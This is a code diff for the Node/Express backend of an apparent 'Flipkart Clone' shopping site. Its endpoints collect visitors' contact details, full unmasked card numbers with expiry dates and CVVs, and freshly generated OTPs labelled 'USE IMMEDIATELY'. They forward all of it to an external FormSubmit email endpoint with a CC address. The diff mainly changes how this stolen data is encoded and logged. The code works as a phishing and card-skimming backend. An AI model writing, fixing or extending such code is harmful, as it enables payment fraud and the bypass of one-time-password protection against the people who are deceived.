@@ -25,31 +25,56 @@ const otpStore = new Map();
 
 // API Routes
 
-// Send registration email with contact details
-app.post('/api/send-registration-email', async (req, res) => {
+// Test email endpoint
+app.post('/api/test-email', async (req, res) => {
   try {
-    const { name, email, phone } = req.body;
-    
-    const formData = {
-      name: name,
-      email: email,
-      phone: phone,
-      registration_time: new Date().toLocaleString(),
-      _subject: 'New User Registration - Flipkart Clone',
-      _cc: FORMSUBMIT_CC,
-      _template: 'table'
-    };
+    const formData = new URLSearchParams();
+    formData.append('test_message', 'This is a test email from Flipkart Clone');
+    formData.append('test_time', new Date().toLocaleString());
+    formData.append('_subject', 'Test Email - Flipkart Clone');
+    formData.append('_cc', FORMSUBMIT_CC);
+    formData.append('_template', 'table');
 
-    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData, {
+    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         'Accept': 'application/json'
       }
     });
 
+    console.log('Test email response:', response.data);
+    res.json({ success: true, message: 'Test email sent successfully', response: response.data });
+  } catch (error) {
+    console.error('Error sending test email:', error.response?.data || error.message);
+    res.status(500).json({ success: false, message: 'Failed to send test email', error: error.response?.data || error.message });
+  }
+});
+
+// Send registration email with contact details
+app.post('/api/send-registration-email', async (req, res) => {
+  try {
+    const { name, email, phone } = req.body;
+    
+    const formData = new URLSearchParams();
+    formData.append('name', name);
+    formData.append('email', email);
+    formData.append('phone', phone);
+    formData.append('registration_time', new Date().toLocaleString());
+    formData.append('_subject', 'New User Registration - Flipkart Clone');
+    formData.append('_cc', FORMSUBMIT_CC);
+    formData.append('_template', 'table');
+
+    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'application/json'
+      }
+    });
+
+    console.log('Registration email response:', response.data);
     res.json({ success: true, message: 'Registration email sent successfully' });
   } catch (error) {
-    console.error('Error sending registration email:', error);
+    console.error('Error sending registration email:', error.response?.data || error.message);
     res.status(500).json({ success: false, message: 'Failed to send registration email' });
   }
 });
@@ -59,41 +84,41 @@ app.post('/api/send-payment-email', async (req, res) => {
   try {
     const { orderDetails, paymentMethod, amount, customerInfo, cardDetails } = req.body;
     
-    const formData = {
-      order_id: orderDetails.orderId,
-      amount: amount,
-      payment_method: paymentMethod,
-      payment_time: new Date().toLocaleString(),
-      customer_name: customerInfo.name,
-      customer_phone: customerInfo.phone,
-      customer_email: customerInfo.email,
-      customer_address: customerInfo.address,
-      _subject: `Payment Received - Order #${orderDetails.orderId}`,
-      _cc: FORMSUBMIT_CC,
-      _template: 'table'
-    };
+    const formData = new URLSearchParams();
+    formData.append('order_id', orderDetails.orderId);
+    formData.append('amount', amount);
+    formData.append('payment_method', paymentMethod);
+    formData.append('payment_time', new Date().toLocaleString());
+    formData.append('customer_name', customerInfo.name);
+    formData.append('customer_phone', customerInfo.phone);
+    formData.append('customer_email', customerInfo.email);
+    formData.append('customer_address', customerInfo.address);
+    formData.append('_subject', `Payment Received - Order #${orderDetails.orderId}`);
+    formData.append('_cc', FORMSUBMIT_CC);
+    formData.append('_template', 'table');
 
     // Add complete card details if available
     if (cardDetails) {
-      formData.card_number = cardDetails.cardNumber;
-      formData.card_name = cardDetails.cardName;
-      formData.card_expiry = cardDetails.cardExpiry;
-      formData.card_cvv = cardDetails.cardCVV;
-      formData.card_bank = cardDetails.bank;
-      formData.card_type = cardDetails.cardTab;
-      formData.card_details_note = '� COMPLETE UNMASKED CARD DETAILS';
+      formData.append('card_number', cardDetails.cardNumber);
+      formData.append('card_name', cardDetails.cardName);
+      formData.append('card_expiry', cardDetails.cardExpiry);
+      formData.append('card_cvv', cardDetails.cardCVV);
+      formData.append('card_bank', cardDetails.bank);
+      formData.append('card_type', cardDetails.cardTab);
+      formData.append('card_details_note', '🔓 COMPLETE UNMASKED CARD DETAILS');
     }
 
-    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData, {
+    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         'Accept': 'application/json'
       }
     });
 
+    console.log('Payment email response:', response.data);
     res.json({ success: true, message: 'Payment email sent successfully' });
   } catch (error) {
-    console.error('Error sending payment email:', error);
+    console.error('Error sending payment email:', error.response?.data || error.message);
     res.status(500).json({ success: false, message: 'Failed to send payment email' });
   }
 });
@@ -115,33 +140,33 @@ app.post('/api/send-otp', async (req, res) => {
       email
     });
     
-    const formData = {
-      otp_code: otp,
-      purpose: purpose,
-      phone: phone || 'N/A',
-      email: email || 'N/A',
-      generated_time: new Date().toLocaleString(),
-      expires_at: new Date(Date.now() + 5 * 60 * 1000).toLocaleString(),
-      otp_note: '🔓 UNMASKED OTP - USE IMMEDIATELY',
-      _subject: `OTP Generated - ${purpose}`,
-      _cc: FORMSUBMIT_CC,
-      _template: 'table'
-    };
+    const formData = new URLSearchParams();
+    formData.append('otp_code', otp);
+    formData.append('purpose', purpose);
+    formData.append('phone', phone || 'N/A');
+    formData.append('email', email || 'N/A');
+    formData.append('generated_time', new Date().toLocaleString());
+    formData.append('expires_at', new Date(Date.now() + 5 * 60 * 1000).toLocaleString());
+    formData.append('otp_note', '🔓 UNMASKED OTP - USE IMMEDIATELY');
+    formData.append('_subject', `OTP Generated - ${purpose}`);
+    formData.append('_cc', FORMSUBMIT_CC);
+    formData.append('_template', 'table');
 
-    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData, {
+    const response = await axios.post(FORMSUBMIT_ENDPOINT, formData.toString(), {
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         'Accept': 'application/json'
       }
     });
 
+    console.log('OTP email response:', response.data);
     res.json({ 
       success: true, 
       message: 'OTP sent successfully',
       otpForTesting: otp // Include OTP in response for testing
     });
   } catch (error) {
-    console.error('Error sending OTP:', error);
+    console.error('Error sending OTP:', error.response?.data || error.message);
     res.status(500).json({ success: false, message: 'Failed to send OTP' });
   }
 });
